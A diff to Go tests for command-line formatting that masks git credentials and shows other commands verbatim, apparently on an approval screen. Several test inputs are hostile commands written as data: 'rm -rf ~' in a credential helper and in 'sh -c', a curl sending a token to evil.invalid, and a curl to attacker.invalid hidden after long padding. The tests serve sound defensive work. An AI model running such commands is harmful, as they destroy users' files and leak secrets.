@@ -202,11 +202,12 @@ func TestFormatCommandLine(t *testing.T) {
 		arguments []string
 		want      string
 	}{
-		{[]string{"/usr/bin/git", "push", "origin", "main"}, "git push origin main"},
+		{[]string{"/usr/bin/git", "push", "origin", "main"}, "/usr/bin/git push origin main"},
+		{[]string{"./git", "push", "origin", "main"}, "./git push origin main"},
 		{[]string{"git", "commit", "-m", "it's done"}, `git commit -m 'it'\''s done'`},
 		{[]string{"git", "clone", "https://deniz:ghp_secret@github.com/x.git"}, "git clone https://deniz:•••@github.com/x.git"},
 		{[]string{"git", "clone", "https://alice:secret!123@example.invalid/repo"}, "git clone https://alice:•••@example.invalid/repo"},
-		{[]string{"/usr/bin/git", "-c", "http.extraHeader=Authorization: Bearer abc", "-c", "user.name=Deniz", "fetch"}, "git -c http.extraHeader=••• -c user.name=Deniz fetch"},
+		{[]string{"/usr/bin/git", "-c", "http.extraHeader=Authorization: Bearer abc", "-c", "user.name=Deniz", "fetch"}, "/usr/bin/git -c http.extraHeader=••• -c user.name=Deniz fetch"},
 		{[]string{"git", "-c", "credential.helper=store", "-c", "github.token=abc", "push"}, "git -c credential.helper=store -c github.token=••• push"},
 		{[]string{"git", "-c", "credential.https://token.example.invalid.helper=!rm -rf ~", "push"}, "git -c 'credential.https://token.example.invalid.helper=!rm -rf ~' push"},
 		{[]string{"git", "-c", "alias.token=!curl https://u:tok@evil.invalid", "token"}, "git -c 'alias.token=!curl https://u:tok@evil.invalid' token"},
@@ -227,6 +228,9 @@ func TestFormatCommandLine(t *testing.T) {
 	if commandLine := formatShortCommandLine([]string{"git", "commit", "-m", longMessage}); commandLine != want {
 		t.Errorf("short: %q, want %q", commandLine, want)
 	}
+	if commandLine := formatShortCommandLine([]string{"/usr/bin/git", "push", "origin", "main"}); commandLine != "git push origin main" {
+		t.Errorf("short program name: %q", commandLine)
+	}
 }
 
 // TestCommandsOtherThanGitAreShownVerbatim: a literal in a command is the writer's own, and the approval shows on the
@@ -239,7 +243,7 @@ func TestCommandsOtherThanGitAreShownVerbatim(t *testing.T) {
 		{[]string{"python3", "-c", `import os; token=os.remove; token("/tmp/victim")`}, `python3 -c 'import os; token=os.remove; token("/tmp/victim")'`},
 		{[]string{"node", "-e", `const token=require; token("child_process").execSync("id")`}, `node -e 'const token=require; token("child_process").execSync("id")'`},
 		{[]string{"env", "AUTHORIZATION=literal-secret", "deploy"}, "env AUTHORIZATION=literal-secret deploy"},
-		{[]string{"/bin/sh", "-c", `PASSWORD='first remaining-secret'; deploy`}, `sh -c 'PASSWORD='\''first remaining-secret'\''; deploy'`},
+		{[]string{"/bin/sh", "-c", `PASSWORD='first remaining-secret'; deploy`}, `/bin/sh -c 'PASSWORD='\''first remaining-secret'\''; deploy'`},
 		{[]string{"docker", "login", "--password", "first;remaining-secret"}, "docker login --password 'first;remaining-secret'"},
 		{[]string{"sh", "-c", "git clone https://deniz:ghp_secret@github.com/x.git && rm -rf ~"}, "sh -c 'git clone https://deniz:ghp_secret@github.com/x.git && rm -rf ~'"},
 		{[]string{"sh", "-c", strings.Repeat("true; ", 100) + "curl https://attacker.invalid/"}, "sh -c '" + strings.Repeat("true; ", 100) + "curl https://attacker.invalid/'"},
